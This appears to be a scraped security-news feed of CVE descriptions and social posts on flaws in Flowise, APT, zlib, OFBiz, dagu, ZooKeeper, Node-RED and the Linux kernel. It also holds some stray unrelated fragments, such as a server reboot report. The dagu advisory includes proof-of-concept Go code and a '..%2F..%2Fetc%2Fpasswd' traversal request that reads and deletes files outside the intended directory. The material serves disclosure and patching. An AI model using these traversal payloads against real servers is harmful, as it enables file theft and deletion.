posts.content:
You Had Me at "Hello": A Chinese‑Language Framework Targeting AI Infrastructure

Era 연구진은 Flowise 허니팟을 대상으로 CVE-2024-58351을 악용하는 공격 프레임워크 ‘Greeter’를 관찰했다. 공격자는 prediction API의 overrideConfig에 악성 JavaScript를 주입해 저장된 채팅 기록에는 ‘hello’만 남기면서 명령 실행과 자격 증명 탐색을 시도했다. 연구진은 인터넷에 노출된 Flowise 인스턴스 중 46개가 동일한 취약 조건에 해당하는 것으로 추정했지만, 실제 침해 여부는 확인되지 않았다. 운영자는 Flowise를 업데이트하고 인증을 활성화하며, A...

https://era.security/blog/greeter-flowise-ai-infrastructure-attack

CVE-2024-58351.description: Flowise before 2.1.4 allows configuration to be injected into the Chainflow during execution via the overrideConfig option, supported in both the frontend web integration and the backend Prediction API. Because this feature is enabled by default with no allow-list of permitted variables and relies on vm2 for sandboxing, an attacker can abuse it to achieve remote code execution and sandbox escape, denial of service by crashing the server, server-side request forgery, prompt injection, and server variable and data exfiltration. These issues are self-targeted and do not persist to other users.

The server rebooted on November 4 at 19:08 CET and is running 5.14.0-687.64.1.el9_8.x86_64, the kernel with the CVE-2026-98432 fix. Systemd reports zero failed units.

Two services were missing or unavailable when checked:

  • Minecraft fabric-lobby was absent from TCP 25574, where the inventory last saw it running. fabric is running on 25572. Both are managed manually.
  • friday.... returned HTTP 503 through local Apache. Its configured backend ports, 5173 and 5174, had no listeners. I couldn’t establish whether it was down before the reboot.

Apache, MySQL, SSH, firewalld, Postfix, OpenDKIM, and the inventoried monitoring services were active. Grafana reported its database healthy, InfluxDB answered its health probe, and the expected filesystems were mounted.

Boot logs: mradmin failed three times during startup, with DNS resolution errors for discord.com, then connected successfully.

CVE-2026-98432.description:
In the Linux kernel, the following vulnerability has been resolved:

ipv4: free inet_opt and ireq_opt after an RCU grace period

tcp_v4_syn_recv_sock() transfers ownership of ireq->ireq_opt to the
child socket (newinet->inet_opt) without copying it.

Another cpu can concurrently process a retransmitted SYN for the same
request socket, and send a SYNACK from tcp_check_req().
tcp_v4_send_synack() and inet_csk_route_req() read ireq->ireq_opt
under rcu_read_lock() only, and ip_build_and_send_pkt() and
ip_options_build() then read opt->optlen twice.

Note that the SYNACK timer itself is not an issue: it holds a
reference on its request socket, and inet_csk_reqsk_queue_drop()
calls timer_delete_sync() before the child can be freed.

Since commit 079096f103fa ("tcp/dccp: install syn_recv requests
into ehash table"), request sockets are processed without holding
the listener lock, so nothing prevents the child socket from being
freed while the SYNACK is still being built. TCP child sockets do
not have SOCK_RCU_FREE, and inet_sock_destruct() frees inet_opt
with a plain kfree(), leading to a use-after-free in
ip_options_build().

A similar issue exists with request socket migration
(net.ipv4.tcp_migrate_req=1, or a BPF_SK_REUSEPORT_SELECT_OR_MIGRATE
program). reqsk_timer_handler() clones the request socket with
inet_reqsk_clone(), so that the old request socket and its clone
share the same ireq_opt, then reqsk_migrate_reset() clears the
pointer in the old one. Another cpu holding a reference on the old
request socket can still be using these options (sending a SYNACK,
or creating a child in tcp_v4_syn_recv_sock()) when the clone is
freed, and tcp_v4_reqsk_destructor() also uses a plain kfree().

Readers already use RCU, and other paths replacing inet_opt
(do_ip_setsockopt(), cipso_v4_sock_setattr()...) already use
kfree_rcu(). Use kfree_rcu() in inet_sock_destruct() and
tcp_v4_reqsk_destructor() as well.

IPv6 is not affected by the first issue, because tcp_v6_syn_recv_sock()
duplicates the options. tcp_v6_reqsk_destructor() has the same
migration issue with ipv6_opt, which is only set by CALIPSO. This
will be addressed in a separate patch.

RT: @sysxplore zlib 1.4 just dropped — and Mark Adler stuffed it with more than a dozen security fixes.

zlib is the compression library under gzip, PNG, package managers, browsers, and language runtimes. If something compresses on your Linux box, it probably touches zlib.

Adler’s notes call out a heap buffer overflow in non-blocking gzwrite() as CVE-2026-85091 (reported by mat-mo / Trail of Bits), plus an out-of-bounds pointer issue in contrib/infback9 as CVE-2026-4738. Also fixed: inflateGetDictionary() writing past a 32K buffer on a bad windowBits (affects 1.3.1 and 1.3.2), inflateBack() copying uninitialized memory, and several minizip path-escape / Zip64 bugs.

On the infback9 CVE Adler wrote: “the pointers return in bounds before use and no known compiler mishandles this, so the critical rating overstates it.”

Affected: mainly zlib 1.3.1 / 1.3.2 (and 1.3.1.2 for the gzwrite overflow). Fixed in zlib 1.4. Distros will package this quickly — watch your updates.

posts.content: RT: @just1cz I used an AI for two hours and found a zero-day that would let a nation-state hack any server running stock Ubuntu. It was patched this morning. CVE-2026-109518. 🧵

🚨 APT PACKAGE VERIFICATION BYPASS: A VERIFIED LINUX PACKAGE CAN STILL BECOME MALICIOUS.

Full technical breakdown, exploitation mechanics, affected versions, and mitigation commands:
🔗 https://thecybersecguru.com/news/cve-2026-109518-apt-download-verification-bypass/

A high-severity vulnerability, CVE-2026-109518 (CVSS 7.7), exposes a dangerous flaw in Debian's APT package manager that could allow an on-path attacker to achieve ROOT CODE EXECUTION on vulnerable Linux systems.

The issue isn't broken cryptography. It's something far more subtle: a TOCTOU race condition combined with hard-link confusion, HTTP redirects, download retries, and file resumption. An attacker can exploit the gap between SHA-256 verification and package installation to overwrite an already verified .deb archive with malicious content. When dpkg subsequently processes the package, malicious maintainer scripts can execute with root privileges.

Even HTTPS isn't a universal escape here. A compromised or malicious repository mirror can still trigger the vulnerable download workflow.

Debian has released security updates. If you manage Debian, Ubuntu, Linux servers, Docker images, or CI/CD build infrastructure, check your APT version and patch immediately.

This is a reminder that package integrity is about more than verifying a checksum. It's also about ensuring the verified bytes remain unchanged until execution.

posts.content:
The #Debian APT security update fixes "Download verification bypass" CVE-2026-109518:

"On Debian, Ubuntu, and derivative Linux distributions, an on-path attacker who can manipulate the HTTP traffic (including a malicious mirror or proxy) between an APT client and an archive server triggered by a package install can trick the client into installing an attacker-controlled unverified package and achieve remote code execution with root privileges. The vulnerability is caused by the reuse of hard links and requires the client to follow redirects and retry the download of package files. It requires the client to have a non-zero Acquire::Retries configuration setting; the value 3 is the default starting with Debian 12 (bookworm) and Ubuntu 22.04 LTS (Jammy Jellyfish), so older releases are unaffected in a default configuration"

https://www.cve.org/CVERecord?id=CVE-2026-109518

Obviously any Debian based distribution using APT can be affected as well and should install updates as soon as they become available.

The vulnerability description doesn't mention this explicitly but if your system doesn't have Emudhra certificates purged, they can be vulnerable even when using HTTPS sources.

#CVE_2026_109518 #infosec #cybersecurity

CVE-2026-83542.description:
Improper Control of Generation of Code ('Code Injection') in Apache OFBiz 24.09 before 24.09.08 on all platforms allows a remote unauthenticated attacker to execute arbitrary code on the server by staging crafted widget XML in a multipart upload and overriding the mainDecoratorLocation used by a manager login route through an anonymous JSON request, causing OFBiz to load the staged XML through its live screen descriptor mechanism and evaluate an unsandboxed Groovy expression while rendering the authentication-failure page. Further validation established the following:

-- The exploit does not require a malformed or incomplete multipart body: a well-formed multipart request that is kept in flight and then allowed to complete normally is sufficient.

-- The screen loader reads the widget XML from a live process file descriptor while the upload is streaming, rather than from any file the attacker persists to disk.

-- The same underlying issue is also reachable through the public, explicitly unauthenticated /sfa/control/editPortalPageColumnWidth route, returning command output directly in an HTTP 200 response — it is not limited to the login-failure rendering path used in the original report.

Users are recommended to upgrade to version 24.09.08, which fixes this issue.

CVE-2026-33344.description:
The fix for CVE-2026-27598 (commit e2ed589, PR #1691) added `ValidateDAGName` to `CreateNewDAG` and rewrote `generateFilePath` to use `filepath.Base`. This patched the CREATE path. The remaining API endpoints - GET, DELETE, RENAME, EXECUTE - all pass the `{fileName}` URL path parameter to `locateDAG` without calling `ValidateDAGName`. `%2F`-encoded forward slashes in the `{fileName}` segment traverse outside the DAGs directory.

### Vulnerable code

`internal/persis/filedag/store.go`, lines 508-513:

```go
func (store *Storage) locateDAG(nameOrPath string) (string, error) {
    if strings.Contains(nameOrPath, string(filepath.Separator)) {
        foundPath, err := findDAGFile(nameOrPath)
        if err == nil {
            return foundPath, nil  // returns arbitrary resolved path
        }
    }
    // ...safe searchPaths branch follows
```

`findDAGFile` resolves the path with `filepath.Abs` and checks only that the file exists with a YAML extension. No containment check against `baseDir`.

Chi v5 routes using `r.URL.RawPath` when set. The pattern `/dags/{fileName}/spec` captures `..%2F..%2Fetc%2Ftarget.yaml` as a single path segment. The oapi-codegen runtime calls `url.PathUnescape`, producing `../../etc/target.yaml`. This decoded string reaches `locateDAG` with the `/` separator intact.

Go's `net/http.ServeMux` would normally redirect paths containing `..`, but dagu binds the chi mux directly to `&http.Server{Handler: r}` (server.go:833-834), so no path cleaning fires.

### Affected endpoints

The three confirmed impacts via `locateDAG`:

| Endpoint | Impact |
|----------|--------|
| `GET /dags/{fileName}/spec` | Arbitrary `.yaml`/`.yml` file read (`os.ReadFile`) |
| `DELETE /dags/{fileName}` | Arbitrary `.yaml`/`.yml` file delete (`os.Remove`) |
| `POST /dags/{fileName}/start` | Load arbitrary YAML, execute as workflow |

Same pattern affects all other `{fileName}` endpoints: `/dag-runs`, `/dag-runs/{id}`, `/rename`, `/start-sync`, `/enqueue`, and webhook handlers. `UpdateDAGSpec` is incidentally blocked by DAG name validation during YAML parsing - not a security check, just data integrity validation that happens to reject `/`.

### PoC

**Store-level** (dagu v2.0.2, Go 1.26, macOS; `locateDAG` unchanged through v2.3.0):

```go
func TestLocateDAGPathTraversal(t *testing.T) {
    baseDir, _ := os.MkdirTemp("", "bd")
    defer os.RemoveAll(baseDir)
    outsideDir, _ := os.MkdirTemp("", "od")
    defer os.RemoveAll(outsideDir)

    store := filedag.New(baseDir, filedag.WithSkipExamples(true))
    ctx := context.Background()
    store.Create(ctx, "legit", []byte("name: legit\nsteps:\n  - name: s\n    command: echo ok\n"))

    target := filepath.Join(outsideDir, "secret.yaml")
    os.WriteFile(target, []byte("password: hunter2\ndb_host: prod-db.internal\n"), 0644)

    rel, _ := filepath.Rel(baseDir, target)
    spec, _ := store.GetSpec(ctx, rel)
    fmt.Println(spec)
}
```

Output:

```
baseDir:    /tmp/bd1816472583
targetFile: /tmp/od3906487343/secret.yaml
traversal:  ../od3906487343/secret.yaml

=== GetSpec (arbitrary file read) ===
SUCCESS: read file outside baseDir
Content:
password: hunter2
db_host: prod-db.internal

=== Delete (arbitrary file delete) ===
SUCCESS: deleted /tmp/od3906487343/important.yaml
```

**HTTP-level** (chi v5.2.2):

```go
r := chi.NewRouter()
r.Get("/dags/{fileName}/spec", func(w http.ResponseWriter, r *http.Request) {
    raw := chi.URLParam(r, "fileName")
    decoded, _ := url.PathUnescape(raw)
    fmt.Fprintf(w, "raw=%s\ndecoded=%s\n", raw, decoded)
})

req := httptest.NewRequest("GET", "/dags/..%2F..%2Fetc%2Ftarget.yaml/spec", nil)
w := httptest.NewRecorder()
r.ServeHTTP(w, req)
```

Output:

```
path: /dags/..%2F..%2Fetc%2Fpasswd/spec
status: 200
raw=..%2F..%2Fetc%2Fpasswd
decoded=../../etc/passwd
```

Chi captures `..%2F..%2Fetc%2Fpasswd` as one path segment via `RawPath`, oapi-codegen decodes `%2F` to `/`. Confirmed with chi v5.2.2.

### Affected versions

- v2.0.0 through v2.3.0 (current latest, checked 2026-03-18).
- The `locateDAG` function with the `filepath.Separator` code path was introduced in commit 1557b14f (PR #1573) as part of the v2.0.0 rewrite.
- The CVE-2026-27598 fix (e2ed589) also landed in v2.0.0 - it patched `CreateNewDAG` but didn't address the new `locateDAG` code path that was introduced in the same release.

### Suggested fix

Add path containment to `locateDAG` rather than sprinkling `ValidateDAGName` across every handler. Reject names containing path separators for HTTP-facing callers. If the separator code path is needed for internal worker communication (PR #1573), split `locateDAG` into a validated public method (HTTP handlers) and an internal method (trusted callers only).

### Impact

An authenticated user (or any user if `auth.mode=none`) can read or delete any `.yaml`/`.yml` file on the server filesystem that the process can access. K8s secrets stored as YAML, app configs, other DAG files.

The execute endpoints also traverse via `locateDAG`, loading the target YAML as a DAG definition. If the file contains valid DAG syntax with shell commands, those commands execute as the dagu process user. I haven't verified this end-to-end since it requires a target file with DAG-compatible structure, but the code path is the same `locateDAG` call confirmed above.

Auth is enabled by default since PR #1688 (v2.0.0), but exploitable by any authenticated user regardless of role - the DAG read/delete paths don't enforce RBAC granularity. Pre-v2.0.0 deployments or those with `auth.mode=none` are exploitable without credentials.

CVE-2026-106069.description:
A flaw in Node.js TLS hostname verification can cause a server certificate to be validated against a different IP address than the one the client connected to, when the host is a non-canonical IPv4 literal with a leading zero, such as `0127.0.0.1`.

`tls.checkServerIdentity()` normalizes the host following the WHATWG URL rules, which read a leading-zero octet as octal (`0127.0.0.1` becomes `87.0.0.1`), while the connection is made through the operating system resolver, which on some platforms such as macOS reads it as decimal (`127.0.0.1`). A server at the connected address can then be authenticated with a certificate issued for another IP address.

This vulnerability affects Node.js **26.x**, **24.x**, and **22.x**.

In Eclipse BaSyx Helm Charts version 2.2.0 of the `aas-basyx-v2-full` chart, deployments with the bundled Keycloak enabled store the client secret of the `basyx-technical-user` OAuth2 client in cleartext in a Kubernetes ConfigMap. This client uses...

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-123059.description:
In Eclipse BaSyx Helm Charts version 2.2.0 of the `aas-basyx-v2-full` chart, deployments with the bundled Keycloak enabled store the client secret of the `basyx-technical-user` OAuth2 client in cleartext in a Kubernetes ConfigMap. This client uses the client-credentials grant and its service account holds the realm `admin` role.



The chart correctly writes `keycloak.technicalUser.clientSecret` to a Kubernetes Secret, but the template `basyx-keycloak-realm.yaml` also substitutes the same value into the Keycloak realm-import JSON, which is stored in the ConfigMap `<keycloak.fullnameOverride>-realm`. A principal that can read ConfigMaps but not Secrets in the release namespace, such as a holder of the built-in Kubernetes `view` ClusterRole, can read the client secret from the ConfigMap. They can then exchange it at the Keycloak token endpoint for an access token with the `admin` role. That token grants full create, read, update, delete and execute rights on all BaSyx repositories and registries in the deployment.



The bundled Keycloak is disabled by default. No fixed release of the `aas-basyx-v2-full` chart exists. Affected users should migrate to the `basyx` chart, or deploy without the bundled Keycloak and rotate the `basyx-technical-user` client secret.

CVE-2026-118193.description: The GiveWP – Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to Privilege Escalation in all versions up to, and including, 4.19.1 via the `donor_default_user_role` parameter. This is due to the `sanitize_option_donor_default_user_role()` function applying only a narrow literal check against the string `'administrator'` rather than enforcing the plugin's own `give_get_donor_safe_user_roles()` allowlist on save, and due to the `give_core_settings_import_callback()` AJAX handler writing imported JSON directly into the `give_settings` option via `update_option()` without invoking the sanitize filter at all. Via the settings save path, the Administrator role is blocked but any other elevated role (Editor, Author, etc.) is accepted; via the Tools › Import JSON path, the sanitize filter is bypassed entirely, allowing the Administrator role itself to be stored and subsequently applied to all newly registered donor accounts.

CVE-2026-123033.description: Authentication bypass in the HA heartbeat origin check in middlewared in TrueNAS SCALE before 25.10.8 (and in release trains before their respective fixes) allows an attacker on the same network segment to achieve unauthenticated full-administrator API access and execute commands as root. middlewared registers the HA peer-authentication hook (ha_permission) unconditionally, with no failover-licence or heartbeat-interface check. An unauthenticated connection whose TCP peer address is a hardcoded HA heartbeat address (169.254.10.1 or 169.254.10.2) and whose peer port is <= 1024 is granted a node credential that is authorized for every API method and treated as full administrator. Both conditions are properties of the attacker's own socket, and thus an attacker on the same layer-2 segment satisfies them without forging anything. The hook is present on non-HA, unlicensed, single-node Community Edition installations. The fix additionally requires that the connection terminate on the HA heartbeat listener (a local address/port the attacker cannot control).

CVE-2026-46300.description:
In the Linux kernel, the following vulnerability has been resolved:

net: skbuff: preserve shared-frag marker during coalescing

skb_try_coalesce() can attach paged frags from @from to @to.  If @from
has SKBFL_SHARED_FRAG set, the resulting @to skb can contain the same
externally-owned or page-cache-backed frags, but the shared-frag marker
is currently lost.

That breaks the invariant relied on by later in-place writers.  In
particular, ESP input checks skb_has_shared_frag() before deciding
whether an uncloned nonlinear skb can skip skb_cow_data().  If TCP
receive coalescing has moved shared frags into an unmarked skb, ESP can
see skb_has_shared_frag() as false and decrypt in place over page-cache
backed frags.

Propagate SKBFL_SHARED_FRAG when skb_try_coalesce() transfers paged
frags.  The tailroom copy path does not need the marker because it copies
bytes into @to's linear data rather than transferring frag descriptors.

CVE-2026-102894.description: GPUStack is an open-source GPU cluster manager for AI model serving and GPU instance provisioning. From 0.7.1 until 2.2.2, the /auth/saml/callback endpoint decoded SAML XML, used its NameID and attributes to resolve or provision a user, and minted a gpustack_session JWT without calling OneLogin_Saml2_Auth.process_response to verify the signature, issuer, audience, destination, or time conditions. Any network client could submit an identity for an existing user, including an administrator, or provision a new non-administrator account, even when SAML was not configured. Response and Assertion identifiers were not consumed, so captured signed responses could also be replayed. This issue is fixed in version 2.2.2.

CVE-2026-100252.description:
Improper Authorization vulnerability in Apache ZooKeeper.

When SASL authentication is enabled on the client port, the server's SASL callback handler grants every authorization identity (authzid) that a client requests, without checking it against the principal the client authenticated as. The server then tries to replace the requested identity with a canonical form of the authenticated principal, derived from the zookeeper.security.auth_to_local rules. If no rule applies to the principal, canonicalization fails and the error is only logged. The client-requested authzid then becomes the session's SASL identity for all ACL checks.

An authenticated client whose principal is not covered by the auth_to_local rules can therefore claim any SASL identity. With the default rules, this includes any Kerberos principal from a realm other than the server's default realm, such as a principal from a cross-realm trusted realm. The client then gets the permissions granted to that identity in sasl ACLs. If the requested identity matches a configured zookeeper.superUser, it gets superuser access to the whole data tree.

Users are recommended to upgrade to version 3.8.8 or 3.9.7, which fixes the issue.

CVE-2026-115448.description:
Uncontrolled recursion in Apache ZooKeeper. The server serializes its data tree to a snapshot by recursing one stack frame per znode level, with no depth bound. A client permitted to create znodes (the default root ACL is open) can build a chain of nested znodes deep enough that taking a snapshot exhausts the JVM stack and kills the snapshot thread; sizes stay within jute.maxbuffer, so existing limits do not prevent it. This is a denial of service that becomes persistent: on restart the server rebuilds the deep tree from its transaction log and fails again while taking the startup snapshot, so it does not return to service, and recovery can entail data loss. The same log affects a leader and its followers, so it can spread across an ensemble.

This issue affects Apache ZooKeeper 3.8.0 through 3.8.7 and 3.9.0 through 3.9.6. Users are recommended to upgrade to 3.8.8 or 3.9.7, which fix the issue. As a workaround, use ACLs and authentication to restrict znode creation rather than relying on the default open root ACL.

posts.content:
🚨 A Linux kernel vhost flaw can let a local attacker cross virtualization boundaries and escalate privileges; CVE-2026-74580

PoC: https://github.com/YounesHfa/CVE-2026-74580

The vulnerability stems from stale vring metadata caching in the kernel’s vhost subsystem.

Reconfiguring a vring while a device IOTLB is attached can lead to out-of-bounds memory access and host kernel memory corruption.

Details

CVSS: 8.8 High
Impact: Local privilege escalation / host kernel compromise
Affected: Multiple Linux kernel versions using vulnerable vhost implementations
Fixed: Vendor-specific patched kernel releases are available

The exploit repository demonstrates the issue against multiple RHEL 9 and RHEL 10 kernel builds and includes automated checks for vulnerable kernel versions and required vhost device permissions.

CVE-2026-74580.description:
In the Linux kernel, the following vulnerability has been resolved:

vhost: reset the vring metadata cache on vring reconfiguration

vq->meta_iotlb[] caches the vhost_iotlb_map that backs each vring
metadata region, and iotlb_access_ok() returns early on a cache hit,
taking the hit as proof that the region has already been validated:

	if (vhost_vq_meta_fetch(vq, addr, len, type))
		return true;

The cache is reset on VHOST_IOTLB_UPDATE and VHOST_IOTLB_INVALIDATE, on
device IOTLB (re)initialisation and on vq reset, but not when
VHOST_SET_VRING_ADDR replaces vq->desc, vq->avail and vq->used, nor when
VHOST_SET_VRING_NUM changes the region sizes.

With a device IOTLB attached both ioctls are accepted while the vq is
live, and neither validates the addresses at ioctl time: vq_access_ok()
and vq_log_used_access_ok() return true early because the addresses are
GIOVAs, deferring validation to prefetch time.  Once the cache has been
populated that deferred validation no longer runs -- vq_meta_prefetch()
hits the stale entry and returns true -- and vhost_vq_meta_fetch() keeps
translating through the old mapping as

	map->addr + addr - map->start

for an address the mapping no longer covers.  vhost_copy_to_user() and
vhost_copy_from_user() consume the result with __copy_to_user() and
__copy_from_user(), which do not check it either, so a subsequent used
ring update or descriptor fetch accesses memory outside the region the
IOTLB actually maps.

Reset the metadata cache whenever the vring is reconfigured, so the new
addresses are pushed back through iotlb_access_ok()'s slow path.

Critical Node-RED Vulnerability Exploited to Deploy Botnets and Webshells

Hackers are exploiting a CVSS 10.0 vulnerability in Node-RED (CVE-2026-58115) to deploy botnets and webshells on industrial and commercial servers. The flaw allows unauthenticated remote code execution by creating malicious programming flows on instances that lack proper authentication.

**Make sure all Node-RED instances and Siemens SIMATIC IoT2050 devices are isolated from the internet and can only be reached from trusted networks, then update the IoT2050 to version 4.3.4.1 or later and turn on “adminAuth” so the Node-RED editor asks for a password. Look through your existing flows for any “exec” nodes or HTTP endpoints you don’t recognize, and if you find any, treat the device as hacked: rebuild it from a clean image and change its passwords.**
#cybersecurity #infosec #attack #activeexploit
https://beyondmachines.net/event_details/critical-node-red-vulnerability-exploited-to-deploy-botnets-and-webshells-t-7-0-b-2/gD2P6Ple2L

CVE-2026-58115.description:
A vulnerability has been identified in SIMATIC IoT2050 Advanced (6ES7647-0BA00-1YA2) (All versions < V4.3.4-1 running Industrial OS with Node-RED installed), SIMATIC IoT2050 Basic (6ES7647-0BA00-0YA2) (All versions < V4.3.4-1 running Industrial OS with Node-RED installed), SIMATIC IoT2050 M.2 (6ES7647-0BB00-1YA2) (All versions < V4.3.4-1 running Industrial OS with Node-RED installed), SIMATIC IoT2050 SM (6ES7647-0CA00-1AA2) (All versions < V4.3.4-1 running Industrial OS with Node-RED installed). Affected devices do not enforce authentication on the Node-RED HTTP interface, allowing unauthenticated access to programming nodes that are capable of executing system commands on the server.
This could allow an unauthenticated remote attacker to create malicious flows through the HTTP interface in order to execute arbitrary code on the underlying server with maximum privileges.

CVE-2026-92704.description: SharpEmu is an experimental PlayStation 5 emulator for Windows and Linux. In version 0.0.3-release.3 and earlier, the repository-provided debugger frontend tooling is vulnerable while running. This tooling is not included in the release archives. The frontend exposes an HTTP API on 127.0.0.1:8765 without authentication or CSRF token. Its  do_POST  handler in  tools/SharpEmu.DebuggerFrontend/debugger_frontend.py  does not validate the Origin, Referer, Sec-Fetch-Site, or Host headers. The  _read_json_body()  function also accepts JSON sent with browser-simple content types instead of requiring  application/json . A malicious page that can reach the loopback listener can send cross-origin requests to  /api/launch ,  /api/command , and  /api/connect . Chromium may require Local Network Access permission for pages served from public origins. Local-origin pages and other delivery paths are not consistently subject to this restriction. The  /api/launch  endpoint accepts an attacker-selected  emulatorPath  if it points to an existing file on the victim’s host. On POSIX systems, that file must also be executable. The endpoint additionally requires an existing  ebootPath . The  /api/command  endpoint exposes debugger operations, including  write-memory ,  set-register , and  continue . The  /api/connect  endpoint can initiate outbound TCP connections. These operations can let an attacker execute an existing binary with the victim’s privileges, control the attached emulated process, or reach network services accessible from the host. DNS rebinding can additionally let the attacker read API responses interactively. This issue is fixed in version 0.0.3-release.3-patch.1

CVE-2026-18963.description: A flaw was found in the reset-credentials flow of the keycloak-services component, which is the core engine for identity and access management in Red Hat Build of Keycloak. The issue allows an unauthenticated attacker to force the password reset process for any user without needing to click the required email verification link. This can result in the attacker gaining full control over target user accounts by directly setting new credentials.

CVE-2026-110935.description: The PFI plugin framework deployment routine does not validate path components when extracting archive entries to the local plugin repository. Archive entries containing relative path segments such as '..' are not rejected, allowing an unauthenticated local attacker to write files outside the plugin repository to arbitrary locations accessible with the current user's permissions which could result in full system compromise.
